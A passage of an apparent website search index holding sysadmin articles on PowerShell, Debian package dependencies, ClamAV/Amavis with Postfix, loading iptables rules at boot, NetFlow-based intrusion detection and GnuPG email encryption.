monfichier.txt; $b.CreationTime $b = Get-ChildItem monfichier.txt; $b.LastAccessTime The Power of .Net linkAll PowerShell commands have been written based on .Net object classes, whereas initially one might have thought it was WMI. This allows for two things: first, you have access to the entire .Net framework classes (which offers extended functionality compared to WMI), and second, if you are familiar with .Net development, it will be all the easier for you to learn PowerShell (and vice versa of course!).\nLet’s not forget that “who can do more, can do less,” so to not fail this motto PowerShell is also capable of calling WSH, COM, and WMI objects in addition to .Net objects.\nThe Richness of Commands linkPowerShell includes a set of nearly 130 commands, while CMD has only 70. You will discover this through the next article dedicated to commands.\nThe Consistency of Commands and Their Parameters linkAll commands are part of the same object class. They therefore naturally inherit the same parameters. Thus, if you master the parameters of one command, you master them virtually for all others.\nHelp on Commands linkPowerShell has very comprehensive built-in help. It has 3 levels of detail. The first is obtained by asking for help without specifying parameters, such as:\nPS C:\\\u003e Get-Help Get-ChildItem The second is obtained by adding the “-detailed” parameter and the last with the “-full” parameter. Moreover, the help is in English, so why not take advantage of it!?\nYou can also get help on a very specific topic, for example on the use of the pipe. To do this, use the following command:\nPS C:\\\u003e Get-Help about_pipeline To get the list of help topics, type the command:\nPS C:\\\u003e Get-Help about* "
            }
        );
    index.add(
            {
                id:  606 ,
                href: "\/Trouver_toutes_les_d%C3%A9pendances_li%C3%A9es_%C3%A0_un_package\/",
                title: "Find all dependencies related to a package",
                description: "How to find all dependencies related to a package in Debian-based systems using apt-rdepends",
                content: "Introduction linkSometimes it’s very practical to find all dependencies of a package. Here’s a useful command for this purpose.\nInstallation linkInstallation:\napt-get install apt-rdepends Example search:\n$ apt-rdepends libapache2-mod-php5 Reading package lists... Done Building dependency tree... Done libapache2-mod-php5 Depends: apache2-mpm-itk Depends: apache2-mpm-prefork (\u003e\u003e 2.0.52) Depends: apache2.2-common Depends: libbz2-1.0 Depends: libc6 (\u003e= 2.3.6-6) Depends: libcomerr2 (\u003e= 1.33-3) Depends: libdb4.4 Depends: libkrb53 (\u003e= 1.4.2) Depends: libmagic1 Depends: libpcre3 (\u003e= 4.5) Depends: libssl0.9.8 (\u003e= 0.9.8c-1) Depends: libxml2 (\u003e= 2.6.27) Depends: mime-support (\u003e= 2.03-1) Depends: php5-common (= 5.2.0-8+etch1) Depends: ucf Depends: zlib1g (\u003e= 1:1.2.1) apache2-mpm-itk Depends: apache2.2-common (= 2.2.3-4+etch5) Depends: libapr1 Depends: libaprutil1 Depends: libc6 (\u003e= 2.3.6-6) Depends: libcap1 Depends: libdb4.4 Depends: libexpat1 (\u003e= 1.95.8) Depends: libldap2 (\u003e= 2.1.17-1) Depends: libpcre3 (\u003e= 4.5) Depends: libpq4 (\u003e= 8.1.4) Depends: libsqlite3-0 (\u003e= 3.3.8) Depends: libuuid1 apache2.2-common Depends: apache2-utils Depends: libmagic1 Depends: lsb-base Depends: mime-support Depends: net-tools Depends: procps apache2-utils Depends: libapr1 Depends: libaprutil1 Depends: libc6 (\u003e= 2.3.6-6) Depends: libdb4.4 Depends: libexpat1 (\u003e= 1.95.8) Depends: libldap2 (\u003e= 2.1.17-1) Depends: libpcre3 (\u003e= 4.5) Depends: libpq4 (\u003e= 8.1.4) Depends: libsqlite3-0 (\u003e= 3.3.8) Depends: libssl0.9.8 (\u003e= 0.9.8c-1) Depends: libuuid1 libapr1 Depends: libc6 (\u003e= 2.3.6-6) Depends: libuuid1 libc6 Depends: tzdata tzdata libuuid1 Depends: libc6 (\u003e= 2.3.6-6) libaprutil1 Depends: libapr1 Depends: libc6 (\u003e= 2.3.6-6) Depends: libdb4.4 Depends: libexpat1 (\u003e= 1.95.8) Depends: libldap2 (\u003e= 2.1.17-1) Depends: libpq4 (\u003e= 8.1.4) Depends: libsqlite3-0 (\u003e= 3.3.7) Depends: libuuid1 libdb4.4 Depends: libc6 (\u003e= 2.3.6-6) libexpat1 Depends: libc6 (\u003e= 2.3.6-6) libldap2 Depends: libc6 (\u003e= 2.3.6-6) Depends: libgnutls13 (\u003e= 1.4.0-0) Depends: libsasl2-2 libgnutls13 Depends: libc6 (\u003e= 2.3.6-6) Depends: libgcrypt11 (\u003e= 1.2.2) Depends: libgpg-error0 (\u003e= 1.4) Depends: liblzo1 Depends: libopencdk8 (\u003e= 0.5.8) Depends: libtasn1-3 (\u003e= 0.3.4) Depends: zlib1g (\u003e= 1:1.2.1) libgcrypt11 Depends: libc6 (\u003e= 2.3.6-6) Depends: libgpg-error0 (\u003e= 1.2) libgpg-error0 Depends: libc6 (\u003e= 2.3.6-6) liblzo1 Depends: libc6 (\u003e= 2.3.5-1) libopencdk8 Depends: libc6 (\u003e= 2.3.6-6) Depends: libgcrypt11 (\u003e= 1.2.2) Depends: libgpg-error0 (\u003e= 1.4) Depends: zlib1g (\u003e= 1:1.2.1) zlib1g Depends: libc6 (\u003e= 2.3.6-6) libtasn1-3 Depends: libc6 (\u003e= 2.3.6-6) libsasl2-2 Depends: libc6 (\u003e= 2.3.6-6) Depends: libdb4.2 libdb4.2 Depends: libc6 (\u003e= 2.3.6-6) libpq4 Depends: libc6 (\u003e= 2.3.6-6) Depends: libcomerr2 (\u003e= 1.33-3) Depends: libkrb53 (\u003e= 1.4.2) Depends: libssl0.9.8 (\u003e= 0.9.8c-1) libcomerr2 Depends: libc6 (\u003e= 2.3.6-6) libkrb53 Depends: libc6 (\u003e= 2.3.6-6) Depends: libcomerr2 (\u003e= 1.33-3) libssl0.9.8 Depends: debconf (\u003e= 0.5) Depends: debconf-2.0 Depends: libc6 (\u003e= 2.3.6-6) Depends: zlib1g (\u003e= 1:1.2.1) debconf Depends: debconf-english Depends: debconf-i18n PreDepends: perl-base (\u003e= 5.6.1-4) debconf-english Depends: debconf debconf-i18n Depends: debconf Depends: liblocale-gettext-perl Depends: libtext-charwidth-perl Depends: libtext-iconv-perl Depends: libtext-wrapi18n-perl liblocale-gettext-perl Depends: libc6 (\u003e= 2.3.2.ds1-21) PreDepends: perl-base (\u003e= 5.8.7-3) PreDepends: perlapi-5.8.7 perl-base PreDepends: libc6 (\u003e= 2.3.6-6) perlapi-5.8.7 libtext-charwidth-perl Depends: libc6 (\u003e= 2.3.6-6) Depends: perl-base (\u003e= 5.8.8-6) Depends: perlapi-5.8.8 perlapi-5.8.8 libtext-iconv-perl Depends: libc6 (\u003e= 2.3.6-6) Depends: perl-base (\u003e= 5.8.8-6) Depends: perlapi-5.8.8 libtext-wrapi18n-perl Depends: libtext-charwidth-perl debconf-2.0 libsqlite3-0 Depends: libc6 (\u003e= 2.3.6-6) libpcre3 Depends: libc6 (\u003e= 2.3.6-6) libmagic1 Depends: libc6 (\u003e= 2.3.6-6) Depends: zlib1g (\u003e= 1:1.2.1) lsb-base Depends: ncurses-bin Depends: sed ncurses-bin PreDepends: libc6 (\u003e= 2.3.6-6) PreDepends: libncurses5 (\u003e= 5.4-5) libncurses5 Depends: libc6 (\u003e= 2.3.6-6) sed PreDepends: libc6 (\u003e= 2.3.6-6) mime-support net-tools Depends: libc6 (\u003e= 2.3.2.ds1-21) procps Depends: libc6 (\u003e= 2.3.6-6) Depends: libncurses5 (\u003e= 5.4-5) Depends: lsb-base (\u003e= 3.0-10) libcap1 Depends: libc6 (\u003e= 2.3.2.ds1-4) apache2-mpm-prefork Depends: apache2.2-common (= 2.2.3-4) Depends: libapr1 Depends: libaprutil1 Depends: libc6 (\u003e= 2.3.6-6) Depends: libdb4.4 Depends: libexpat1 (\u003e= 1.95.8) Depends: libldap2 (\u003e= 2.1.17-1) Depends: libpcre3 (\u003e= 4.5) Depends: libpq4 (\u003e= 8.1.4) Depends: libsqlite3-0 (\u003e= 3.3.8) Depends: libuuid1 libbz2-1.0 Depends: libc6 (\u003e= 2.3.6-6) libxml2 Depends: libc6 (\u003e= 2.3.6-6) Depends: zlib1g (\u003e= 1:1.2.1) php5-common Depends: sed (\u003e= 4.1.1-1) ucf Depends: coreutils (\u003e= 5.91) Depends: debconf (\u003e= 1.2.0) Depends: debconf-2.0 coreutils PreDepends: libacl1 (\u003e= 2.2.11-1) PreDepends: libc6 (\u003e= 2.3.6-6) PreDepends: libselinux1 (\u003e= 1.32) libacl1 Depends: libattr1 (\u003e= 2.4.4-1) Depends: libc6 (\u003e= 2.3.6-6) libattr1 Depends: libc6 (\u003e= 2.3.5-1) libselinux1 Depends: libc6 (\u003e= 2.3.6-6) Depends: libsepol1 (\u003e= 1.14) libsepol1 Depends: libc6 (\u003e= 2.3.6-6) "
            }
        );
    index.add(
            {
                id:  607 ,
                href: "\/Daloradius_:_Mise_en_place_d\u0027un_serveur_FreeRadius_avec_interface_web_Daloradius\/",
                title: "DaloRADIUS: Setting up a FreeRadius server with DaloRADIUS web interface",
                description: "Documentation for implementing FreeRadius with MySQL account management and DaloRADIUS web interface for Authentication, Authorization, and Accounting.",
                content: "Here is documentation that allows you to set up FreeRadius with MySQL account management and a web interface with DaloRADIUS:\nAuthentication Authorization Accounting with FreeRadius MySQL backend web based Management with DaloRADIUS\n"
            }
        );
    index.add(
            {
                id:  608 ,
                href: "\/Mise_en_place_d\u0027un_Antivirus_(ClamAV_et_Amavis)\/",
                title: "Setting up an Antivirus (ClamAV and Amavis)",
                description: "This guide explains how to set up ClamAV antivirus with Amavis to integrate with Postfix for email scanning.",
                content: "Introduction linkClamAV is the antivirus component while Amavis is the interface that connects Postfix with add-ons such as antispam and antivirus tools.\nInstallation linkFirst, let’s install what we need:\napt-get install amavisd-new clamav clamav-daemon zoo unzip unzoo bzip2 At the end of the installation, it will ask you some questions. Here are the answers you should provide:\nVirus database update method: \u003c-- daemon Local database mirror site: \u003c-- db.fr.clamav.net (France; select the mirror that is closest to you) HTTP proxy information (leave blank for none): \u003c-- (blank) Should clamd be notified after updates? \u003c-- Yes Configuration linkNext we’ll add these lines to /etc/postfix/main.cf:\n# Use Amavis content_filter = amavis:[127.0.0.1]:10024 receive_override_options = no_address_mappings Now let’s edit /etc/postfix/master.cf and add:\namavis unix - - n - 2 smtp -o smtp_data_done_timeout=1200 -o disable_dns_lookups=yes 127.0.0.1:10025 inet n - n - - smtpd -o content_filter= -o local_recipient_maps= -o relay_recipient_maps= -o smtpd_restriction_classes= -o smtpd_client_restrictions= -o smtpd_helo_restrictions= -o smtpd_sender_restrictions= -o smtpd_recipient_restrictions=permit_mynetworks,reject -o mynetworks=127.0.0.0/8 -o strict_rfc821_envelopes=yes We restart Postfix and it’s working :-)\n/etc/init.d/postfix restart You can test it using the Eicar website.\nFAQ linkwarning: connect to transport amavis: No such file or directory linkHere’s the command to reallocate emails:\npostsuper -r ALL Then check with:\npostqueue -p or\nmailq Resources linkASSP: Documentation on implementing a simplification and enhancement tool for SPAM and Virus detection\nClamAV, the antivirus from the cold\n"
            }
        );
    index.add(
            {
                id:  609 ,
                href: "\/Lancer_les_r%C3%A8gles_de_Firewalling_avant_que_les_interfaces_deviennent_up\/",
                title: "Launch Firewall Rules Before Interfaces Come Up",
                description: "This guide explains how to configure your firewall rules to load before network interfaces come up, ensuring your system is always protected by a firewall.",
                content: "Introduction linkThere used to be a script to do it automatically via init.d files, but now the suggested method is to use ifup.d networking scripts, which are executed on state changes of the network interfaces. So I submit here my simple script, which does the trick for me nicely.\nConfiguration linkDrop this script into /etc/network/if-pre-up.d in a file called iptables:\n#!/bin/sh # Load iptables rules before interfaces are brought online # This ensures that we are always protected by the firewall # # Note: if bad rules are inadvertently (or purposely) saved it could block # access to the server except via the serial tty interface. # RESTORE=/sbin/iptables-restore STAT=/usr/bin/stat IPSTATE=/etc/iptables.conf test -x $RESTORE || exit 0 test -x $STAT || exit 0 # Check permissions and ownership (rw------- for root) if test `$STAT --format=\"%a\"` $IPSTATE -ne \"600\"; then echo \"Permissions for $IPSTATE must be 600 (rw-------)\" exit 0 fi # Since only the owner can read/write to the file, we can trust that it is # secure. We need not worry about group permissions since they should be # zeroed per our previous check; but we must make sure root owns it. if test `$STAT --format=\"%u\"` $IPSTATE -ne \"0\"; then echo \"The superuser must have ownership for $IPSTATE (uid 0)\" exit 0 fi # Now we are ready to restore the tables $RESTORE \u003c $IPSTATE Then make sure you make the script executable:\nchmod +x iptables chown root:root iptables It loads the settings from $IPSTATE - by default, /etc/iptables.conf. You have to save the rules manually; this ensures that you make sure your rules are working properly (i.e. doesn’t block you from logging in remotely, for example) before you decide to save them.\nYou do this running the command: “iptables-save \u003e /etc/iptables.conf” (or whatever file you have chosen to use as your $IPSTATE file)\nResources linkhttps://www.debian-administration.org/articles/615\n"
            }
        );
    index.add(
            {
                id:  610 ,
                href: "\/Les_flux_r%C3%A9seaux\/",
                title: "Network Flows",
                description: "Understanding network flows and their applications in network monitoring and security.",
                content: "Introduction linkNetwork flows about network denial of service attacks is the subject addressed here. Indeed, network flows allow for very simple detection of distributed denial of service attacks due to the quantity of flows generated by the zombie army attacking you.\nIn this article, we’ll present other applications of these network flows: intrusion detection or policy violation, detection of hidden channels, or even worm proliferation to name just a few examples. While the detection of distributed denial of service is something relatively specific to operators and Internet service providers, are the other applications well suited to an internal network?\nNetflow linkNetflow is Cisco’s implementation of the technology. Originally, Netflow was a routing technology that consisted of “routing” by flows, which is not widely used nowadays. Each packet that passes through a router generates either a new flow or becomes part of an existing flow. The main characteristics of the IP datagram (by the standards of the time, which is not necessarily the case today since many applications encapsulate in other protocols), namely source and destination IP addresses, source and destination ports (or other features like message type and code for ICMP), transport protocol, ToS (Type of Service) as well as the input interface form the basic seven-tuple. Other information is added such as data and packet counters, output interface, TCP flags (here ends the characteristics of version 1), AS number (version 5), and the address of the next hop (i.e. the next router traversed). The lifetime of a flow in the cache is limited: on a router, it is destroyed after 15 seconds of inactivity, 30 minutes of activity, upon a TCP RST/FIN, or when the cache is full. Also note that a flow is unidirectional, so a TCP session generates two flows (one inbound, one outbound).\nWith the rise of MPLS networks, the packet is no longer routed but switched based on labels. Netflow has been adapted to allow accounting in such environments (Netflow version 9). The most commonly deployed version is version 5. Version 8 adds support for flow aggregation on the router side, while version 9, besides MPLS support and greater flexibility, adds IPv6 support and is closely aligned with IPFIX (or vice versa), the IETF standard for network flows.\nUntil recently, Netflow was ingress-only, meaning that only packets entering an interface were accounted for. In recent IOS versions (if the hardware supports it), egress netflow can be configured. This allows detecting incoming and outgoing attacks without having to configure Netflow on all router interfaces and verifying that the flow is not counted multiple times when traversing a large network.\nThere are three sampling methods: “full”, “sampled”, “random sampled”.\nFull generates information for each network flow that will be exported. This is the oldest method and is supported on almost all routers, but is no longer very common among operators because the router load and amount of accounting information generated, especially during a distributed denial of service, are too significant. However, in an internal network, it is almost mandatory if you want to detect slow reconnaissance or policy violations trying to be discreet.\nSampled allows defining the percentage of flows to export over the total number of generated flows. Generally, operators limit themselves to 1 in 100, or even 1 in 1000. Even at 1 in 1000, a distributed denial of service remains relatively easy to detect. The advantage of this method is the reduction of the router’s CPU load and the amount of Netflow exported. The disadvantage is that it is not good from a statistical point of view (deterministic function).\nRandom Sampled was introduced relatively recently on platforms of the 72xx/75xx type (while sampled was only available on GSRs and 76xx, i.e., routers that support distributed CEF). The difference between sampled and random sampled is that the latter selects a datagram randomly from among the configured, which is statistically better.\nUntil recently, sampling was per router; in very recent IOS versions, it is possible to classify datagrams according to different attributes (IP header fields, NBAR, etc.) and have sampling levels per class.\nExamples of configuration for a router and multi-level switch are available in issue 4 of MISC. Note that in recent IOS versions for switches of the 65xx/76xx family, versions 5 and 8 are supported (the TCP flag was not present in version 7, among other things), but the configuration, differences in functionality depending on the supervisor and routing cards, and choosing the right IOS remain a bit of a puzzle.\nIn networks without routers or with equipment that cannot generate Netflow, an alternative is to connect a PC to a port in listening mode (SPAN or mirror port) and use it to export Netflow information. A list of tools (Netflow clients and servers, PCAP-\u003eNetflow generators) is available here: https://www.switch.ch/tf-tant/floma/software.html. This approach obviously doesn’t really scale, even on an internal enterprise network once it becomes large and not all traffic passes through a well-defined core.\nWe have discussed Netflow probes and sources, but what about the server side?\nThe storage method (text file, database, etc.) and the retention policy have an impact on the size of the disks you will need, but another important element is flow aggregation. This function is also available in Netflow version 8 and can therefore be activated at the source, on the router, but you should avoid activating it to avoid losing granularity. On the server, the consolidation policy must take into account active/non-active flows and time: if you aggregate over a day, the same source/destination IP pair and source/destination port (especially if these are highly demanded services like DNS) could appear multiple times and be consolidated into a single flow, which would be incorrect.\nNetflow or PCAP? linkThe best answer is probably: both. Indeed, Netflow ignores the application content transported (only elements of the IP header and headers of transport layer protocols are processed), while a complete network trace allows you to have all this information. Netflow provides a macroscopic view of the network, PCAP a microscopic view. By focusing too much on the microscopic, we often tend to forget the global vision, especially in the context of network problem resolution. Additionally, as with logs generated by systems and applications, it is advisable to define a centralization policy for network “logs” - this is a prerequisite for post-mortem analysis of incidents.\nFor cost and management reasons, to name just these two factors, it quickly becomes clear that you cannot deploy a listening probe on all switches in a network. So why not simply make PCAP captures in strategic locations of the network? This alternative is a fairly good approach in many cases, but a major problem must be solved first: what is the capacity of my storage system? Indeed, a complete capture takes up a lot of space, and the amount of GB (or TB) available (and their cost) will quickly limit the number of probes and retention period…\nThe most interesting approach is to deploy Netflow across the entire network and listening probes at strategic locations: communication between the inside and outside of the network (Internet access, remote maintenance, VPN access, partner extranet, etc.), the core of the network (if you concentrate all your traffic on a few “large” switches), in front of critical servers, etc. If you decide to centralize this information, you will also have to take into account that your network traffic will double (normal traffic + PCAP traffic between probes and storage base), or set up a dedicated network for this purpose (which will also avoid re-sniffing the PCAP traces).\nNothing prevents you from linking these two systems. For example, it may be interesting to connect a Netflow-based anomaly detection system with a network intrusion detection tool (NIDS). With this approach, if Netflow detects an anomaly, you can either activate PCAP probes to try to get more information (if the event or attack is still ongoing), or if you have a rolling snapshot stored in a database for a few hours, launch a query. Or conversely, the NIDS raises an alert and you retrieve Netflow history from your database.\nDetection linkBefore talking about detection, it is appropriate to address the topic of discovery… How many administrators or network managers know their network architecture and the traffic it carries well?\nNetwork Discovery linkA very interesting application of network flows is network discovery: they allow you to map it, discover the applications using it, characterize “usual” behavior (baseline), etc. This discovery stage often leads to a “cleaning” stage, or even the definition of a new architecture based on security segmentation needs (networks with different levels of sensitivity).\nScanning linkA scan (especially if it’s not a slow scan) is relatively simple to detect: many small flows to the same destination (IP address or port) with, if it’s a TCP scan, few established sessions (by monitoring TCP flags) and for a UDP scan, many ICMP return messages to signal that the port is closed (or no response if the firewall or host is strict).\nViruses and Worms linkThe detection of viruses and worms remains a relatively simple application to implement. Indeed, most of them are not very discreet and seek to spread very quickly, most often either by direct infection attempt or after a search for open ports. An infected machine will generate many very short and very small flows to a large number of machines and/or ports.\nMany worms include an engine that will look for new machines to infect following a more or less random algorithm. Most often, the network prefix of the source machine is the first to be scanned, then the upper subnet, and finally addresses taken more or less randomly (pseudo-random). At this point, datagrams may have as their destination a so-called “bogon” network prefix (https://www.cymru.com/Documents/bogon-dd.html#dd-route-non), meaning it has not yet been allocated or is not supposed to be present in the BGP routing tables of the Internet.\nOften, when an attacker decides to launch a denial of service, they communicate to the agents that are part of their zombie army to forge (spoof) their source IP address. If you see outgoing flows with source addresses that are not part of your internal addressing plan, then the probability of infection is high.\nTo detect viruses that connect to sites (often via HTTP) to retrieve a new payload, it can be interesting to place in a special rule all sites listed by antivirus editors in the public descriptions they make available on their sites.\nHidden channels and backdoors are commonly found on WiFi networks based on encapsulation in ICMP or DNS. In enterprise environments, tunneling over HTTP is most common. These flows are generally to and from the same IP addresses, the destination port is fixed, and the flow size is significant: an ICMP or DNS flow that lasts more than a few seconds and exceeds a few kilobytes quickly becomes suspicious, as does an HTTP flow that is relatively symmetrical in terms of size and long (whereas HTTP flow is typically short - except downloads - and very asymmetric - sending vs. receiving).\nA backdoor often translates into a flow to a non-standard port on the infected system, especially if this flow appears at odd hours. It can also be interesting to set up rules to detect Trojans that listen on their default port. Another type of backdoor is the “alternative” access to the Internet: in many companies, the very strict filtering policy is no longer to the liking of certain people. Flows to or from public IP addresses that do not transit through your Internet access gateway deserve to be analyzed.\nCompromised machines, especially if they are servers, can be detected during remote control by the attacker: this often occurs via connection to a non-standard listening port. However, some exploits use a mechanism that allows going back through the same port as the application, or even using the same session. These are not easy to detect, but unless a backdoor is set up, it is not always easy to re-exploit the same vulnerability several times in a row (due to crashes during or because of exploitation), and the fact of keeping the session open could also be detected.\nIt is also important to observe the TCP flags (be careful, check if it is actually sent, which is not always the case) which often allow determining the direction of communication, namely which side is the client and which side is the server.\nDefining a flow policy for different systems (clients and servers) makes it easy to detect an event that deviates from the baseline. Systems are grouped according to their network behavior and the different exchanges, either between these groups (for a coarse view) or between all systems (for a very fine view). The complexity of the system increases with the number of flows and the number of systems, which must be taken into account during the design phase (complexity of detection, but especially of policy definition).\nTo go further, you can store MAC address/physical port@equipment pairs in the database. This allows tracking the movement of these addresses on the network (laptops, WiFi, DHCP, etc.), alerting if new addresses appear, and coupled with Netflow historical data, detecting major deviations in behavior. It is likely that information such as MAC address and VLAN ID will be added to Netflow exports in the near future, which will avoid having to combine Netflow with SNMP polls to retrieve this information.\nSpyware, IM and Auto-update linkIt can be interesting to monitor the first flows that follow DHCP allocation of network parameters, logging in to the station, or the first outgoing communication: indeed, this is when most “spy tools” and update or reporting features of software start “phoning home”. It is also very common to see flows that return every seconds or minutes with the same source/destination pair (spyware retrieving an ad banner to display or a Trojan sending captured keystrokes for example), but in this case, the risk of false positives is high (automatic page refresh in a browser). Another way to detect spyware and instant messaging tools (or even some P2P clients) is to monitor protocol changes for the same source/destination pair: these tools compete in ingenuity to try to find a hole in the firewall (direct TCP connection, direct UDP “connection”, direct HTTP or via the proxy configured for browsers, encapsulation over ICMP or DNS, etc.).\nAnd even if you don’t deploy a network flow analysis solution, it is very interesting to sniff your computer’s communications, particularly at startup. You often discover interesting and unexpected things.\nFTP, P2P, etc. linkProtocols and applications that use dynamic ports or rely on a control connection and a data connection are not simple to handle. Indeed, Netflow does not maintain state or relationships between two flows, and does not perform any protocol analysis that would be necessary to identify data connections managed by a control connection.\nIt is therefore possible to identify P2P applications based on fixed ports using only network flows. To get around this limitation, some vendors have added a layer that allows identifying the P2P protocol based on signatures, but this has nothing to do with Netflow anymore. A feature like NBAR (Network-Based Application Recognition) or better yet, equipment dedicated to P2P traffic management, are possible options.\nFTP implementations that respect the RFC and some P2P applications are an exception because the data port and control port are +/- 1. So, even if the server listens on a port other than the standard port (21/TCP for FTP and 20/TCP for FTP-DATA), it is possible to identify the control+data pair.\nHistorically, groups that publish “cracked” applications generate files of a standard size (like 1.44 MB in the era when floppy disks were still used), which also helps strengthen the quality of detection based on flow size.\nHistorical Research linkWe often tend to only look at the top 10 of a ranking (such as the user who abuses the company’s Internet connection the most), but in setting up historical data search mechanisms, the top 10 is as important as the bottom 10. And this on all parameters that Netflow allows to have. In this way, we can often detect “lost” flows that can give interesting indications about a well-concealed attack or slow port reconnaissance.\nIt is also interesting to note that, in certain environments (and depending on local laws and regulations), storing only Netflow information does not constitute an invasion of privacy. This less intrusive aspect often allows “selling” this solution internally. And often, the flow says enough and the transported data is just a “bonus,” a bit like an email subject in plain text and its encrypted content…\nThere is a risk related to the injection of false Netflow accounting messages. Indeed, they are neither signed nor encrypted, and the only defense mechanism (very weak) is the sequence number. It is relatively simple to forge such packets, given that they are transported over UDP.\nConclusion linkWe have focused on describing different applications of network flows. As you have seen, their deployment on an internal enterprise network can provide unprecedented visibility, especially nowadays where networks are increasingly open and flows increasingly complex. Even a test deployment can reveal many unsuspected things…\nIf your network is highly segmented, with many firewalls, having Netflow sources in these different segments and a collector that centralizes the flows can help you validate your security policy and especially its implementation.\nThe various examples are far from an exhaustive list; it’s up to you to find new applications and define the detection criteria that correspond to your particular environment. And remember that just as with an intrusion detection tool, the quality of alerts and their number depend on the time spent fine-tuning your configuration.\nThe next step might be to link these detection mechanisms with automatic protection mechanisms (disabling the port on the switch for example). Technologies exist, the future will tell if they will be adopted.\nResources linkhttps://www.unixgarden.com/index.php/administration-reseau/les-flux-reseau\n"
            }
        );
    index.add(
            {
                id:  611 ,
                href: "\/GnuPG:_Crypter_vos_emails\/",
                title: "GnuPG: Encrypt Your Emails",
                description: "A guide on how to encrypt your emails using GnuPG (GNU Privacy Guard) with instructions for key generation, server registration, revocation and usage.",
                content: "Introduction linkThe purpose of this article is to show you how to encrypt your emails. For Mozilla Thunderbird, there is the Enigmail plugin. If you don’t have an email client, don’t want one and prefer webmail… that’s a shame.\nBut wait! :-) There is a plugin called FireGPG for Mozilla Firefox that allows you to encrypt your emails :-)\nTo start, you need to install GPG on your computer. GPG (GnuPG) is the Open Source version of PGP which is paid software.\nInstallation linkStart by installing GPG like any other program:\napt-get install gnupg Generating Your Key linkCreating a Key Pair link“Hold on, what’s a key pair?”\nLet me give you some basic reminders about public key/private key encryption:\nThis system relies on two keys. The public key is used to encrypt a message, and the private key is used to decrypt a message that has been encrypted using the public key. In practice, everyone keeps their private key safely at home and gives their public key to all their contacts. So if I want to encrypt my email and send it to John, I need to have John’s public key in my keyring. If I don’t have it, it’s either because John hasn’t given it to me, or simply because John doesn’t use GPG (which is his right), in which case it’s impossible for me to send an encrypted email to John!\nSo to summarize, if one of my contacts wants to send me an encrypted email, they must first have my public key in their keyring. They will encrypt their email with it, and from then on, the encrypted email can only be decrypted with my private key (not someone else’s private key).\nThe sender themselves would be unable to decrypt the email they just sent - it’s absolutely irreversible. An email encrypted using a public key can only be decrypted by the private key generated at the same time as the public key. That’s the brief theoretical reminder!\nNow for the practical part, open a shell and type:\n$ gpg --gen-key gpg (GnuPG) 1.4.7; Copyright (C) 2006 Free Software Foundation, Inc. This program comes with ABSOLUTELY NO WARRANTY. This is free software, and you are welcome to redistribute it under certain conditions. See the file COPYING for details. Select the type of key you want: (1) DSA and Elgamal (default) (2) DSA (sign only) (5) RSA (sign only) Choose the default option:\n$ Your choice? 1 The DSA key pair will have 1024 bits. ELG-E keys may be between 1024 and 4096 bits long. Personally, I’m a bit paranoid, so I put 4096, but 2048 is sufficient:\nWhat key size do you want? (2048) 4096 The requested size is 4096 bits Specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years I don’t want the key to expire so I don’t have to recreate it later, but sometimes it’s better to do so. It depends on your needs.\nKey is valid for? (0) 0 Key does not expire at all Is this correct? (y/N) y You need a user ID to identify your key; the software constructs the user ID from the Real Name, Comment and Email address in this form: \u003c\u003c Heinrich Heine (Der Dichter) \u003e\u003e Real name: Pierre Mavro Email address: username@domain.com Comment: You selected this USER-ID: \"Pierre Mavro \" Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o You need a Passphrase to protect your secret key. A lot of random bytes need to be generated. You should do other work (type on the keyboard, move the mouse, utilize the disks) during prime generation; this gives the random number generator a better chance to get enough entropy. +++++++++++++++.+++++++++++++++++++++++++.+++++.++++++++++.+++++.+++++.+++++++++++++++++++++++++..+++++.++++++++++++++++++++++++++++++++++++++++.\u003e.+++++............\u003e+++++.....\u003c+++++.....\u003e+++++...\u003c+++++...+++++ A lot of random bytes need to be generated. You should do other work (type on the keyboard, move the mouse, utilize the disks) during prime generation; this gives the random number generator a better chance to get enough entropy. +++++.+++++.++++++++++.++++++++++.++++++++++.+++++.++++++++++.+++++..++++++++++++++++++++.++++++++++.+++++.+++++..+++++++++++++++++++++++++++++++++++.+++++++++++++++.+++++.+++++...+++++\u003e++++++++++......+++++...+++++...+++++..+++++.++++++++++++++++++++\u003e+++++\u003e+++++\u003e.+++++...\u003e+++++...\u003c+++++................................\u003e.+++++........................................................................................+++++^^^^ public and secret key created and signed. gpg: checking the trustdb gpg: 3 marginal(s) needed, 1 complete(s) needed, PGP trust model gpg: depth: 0 valid: 1 signed: 0 trust: 0-. 0g. 0n. 0m. 0f. 1u pub 1024D/A39D9E94 2008-01-06 Key fingerprint = 1457 2EEC F76C 87CF B4A2 CB24 1405 33C6 A3DF 8093 uid Pierre Mavro sub 4096g/E734E40D 2008-01-06 Answer these simple questions and wait for your key to be generated. To verify that your key has been properly generated:\n$ gpg --list-keys /Users/pmavro/.gnupg/pubring.gpg -------------------------------- pub 1024D/A39D9E94 2008-01-06 uid Pierre Mavro sub 4096g/E734E40D 2008-01-06 Here we can see that my public key has been created, and has the ID A39D9E94.\nNote that the small size of this ID (8 characters) suggests a risk of duplication with another generated public key, so to remove any doubt about key identification (although technically it’s also possible to have a duplicate here), we prefer to use the key’s fingerprint:\n$ gpg --fingerprint /Users/pmavro/.gnupg/pubring.gpg -------------------------------- pub 1024D/A39D9E94 2008-01-06 Key fingerprint = 1457 2EEC F76C 87CF B4A2 CB24 1405 33C6 A3DF 8093 uid Pierre Mavro sub 4096g/E734E40D 2008-01-06 There you go, you can now read your public key fingerprint (1457 2EEC F76C 87CF B4A2 CB24 1405 33C6 A3DF 8093), ending with the 8 digits of your previously seen ID. Note this fingerprint on a piece of paper, we’ll use it later.\nRegistering with a Key Server linkOnce your keys are generated, you need to store your public key on a server so that your contacts can find your public key and send you encrypted emails!\nTo do this, we’ll use the server https://pgp.mit.edu, but there are certainly others. Most of them sync with each other, but not always, so it’s best to always use the same server and tell your contacts which one you use to make sure they can find you.\nAnother detail, creating a revocation certificate is essential, for example to notify the key server that your public key is no longer valid and that your contacts should stop using it!\nLet’s create this revocation certificate:\n$ gpg --gen-revoke username@domain.com \u003e username@domain.com.txt sec 1024D/A39D9E94 2008-01-06 Pierre Mavro Create a revocation certificate for this key? (y/N) y Select the reason for the revocation: 0 = No reason specified 1 = Key has been compromised 2 = Key is superseded 3 = Key is no longer used Q = Cancel (You should probably select 1 here) Your decision? 0 Enter an optional description; end it with an empty line: \u003e Just in case \u003e Reason for revocation: No reason specified Just in case Is this okay? (y/N) y You need a passphrase to unlock the secret key for user: \u003c\u003c Pierre Mavro \u003e\u003e 1024-bit DSA key, ID A39D9E94, 